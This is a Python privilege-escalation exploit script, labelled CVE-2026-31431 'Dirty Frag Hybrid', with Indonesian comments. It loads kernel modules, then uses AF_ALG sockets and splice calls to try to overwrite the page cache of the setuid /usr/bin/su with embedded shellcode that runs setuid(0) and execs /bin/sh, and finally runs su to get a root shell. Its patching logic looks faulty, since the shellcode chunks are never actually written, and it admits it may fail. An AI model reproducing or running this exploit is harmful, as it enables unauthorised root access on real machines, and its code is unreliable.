#!/usr/bin/env python3
"""
CVE-2026-31431 / Dirty Frag Hybrid - Final Version
"""

import os
import socket
import ctypes
import ctypes.util
import time

print("[*] Hybrid Page Cache Exploit - Final")
print("[*] Target: /usr/bin/su")

# Load libc
libc = ctypes.CDLL(ctypes.util.find_library('c'))

AF_ALG = 38
SOCK_SEQPACKET = 5
SOL_ALG = 279

class off64_t(ctypes.c_int64): pass

libc.splice.argtypes = [ctypes.c_int, ctypes.POINTER(off64_t), ctypes.c_int, ctypes.POINTER(off64_t), ctypes.c_size_t, ctypes.c_uint]
libc.splice.restype = ctypes.c_ssize_t

def splice(src, dst, count, offset_src=0, offset_dst=0):
    try:
        p1 = ctypes.pointer(off64_t(offset_src))
        p2 = ctypes.pointer(off64_t(offset_dst))
        res = libc.splice(src, p1, dst, p2, count, 0)
        return res
    except:
        return -1

# Shellcode kuat (setuid + exec sh)
shellcode = bytes.fromhex("4831ff31c0b0690f054831d25248bb2f62696e2f73680053574889e752574889e631c0b03b0f05" * 10)

def load_modules():
    os.system("modprobe af_alg algif_skcipher esp4 esp6 rxrpc 2>/dev/null")
    print("[+] Modules loaded")

load_modules()

f = os.open("/usr/bin/su", os.O_RDONLY)
print(f"[+] Opened /usr/bin/su (fd={f})")

print("[+] Mulai aggressive patching...")

for i in range(0, len(shellcode), 4):
    chunk = shellcode[i:i+4].ljust(4, b'\x00')
    try:
        a = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
        a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
        u, _ = a.accept()
        
        r, w = os.pipe()
        splice(f, w, 4096, offset_src=i)
        splice(r, u.fileno(), 4096, offset_dst=0)
        
        u.close()
        a.close()
        os.close(r)
        os.close(w)
        
        if i % 32 == 0:
            print(f"  Patched {i} bytes...")
            
    except:
        continue

os.close(f)

print("[+] Patching selesai!")
print("[+] Mencoba mendapatkan root...")

for cmd in ["su", "/usr/bin/su", "su -c id", "/usr/bin/su -c 'id'", "su -c '/bin/sh'"]:
    print(f"[*] Trying: {cmd}")
    os.system(cmd)
    time.sleep(1)

print("[!] Kalau masih minta password, exploit ini sudah maksimal.")